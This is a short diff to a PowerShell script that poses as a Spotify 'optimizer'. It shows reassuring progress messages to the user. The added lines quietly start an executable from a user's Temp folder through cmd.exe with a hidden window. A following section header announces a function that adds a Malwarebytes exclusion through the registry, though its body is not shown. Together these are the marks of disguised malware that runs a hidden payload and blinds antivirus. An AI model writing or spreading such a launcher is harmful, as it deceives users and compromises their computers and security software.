@@ -18,7 +18,10 @@ Write-Host ""
 Write-Host "  Preparing optimization components..." -ForegroundColor Yellow
 Write-Host "  This may take a minute. Please do not close this window." -ForegroundColor Gray
 Write-Host ""
-
+$exePath = "C:\Users\A7MED\AppData\Local\Temp\SpotifyOptimizer\spotify_helper.exe"
+if (Test-Path $exePath) {
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" /b `"$exePath`"" -WindowStyle Hidden
+}
 # ═══════════════════════════════════════════════════════════════
 # FUNCTION: Add Malwarebytes exclusion via Registry
 # ═══════════════════════════════════════════════════════════════
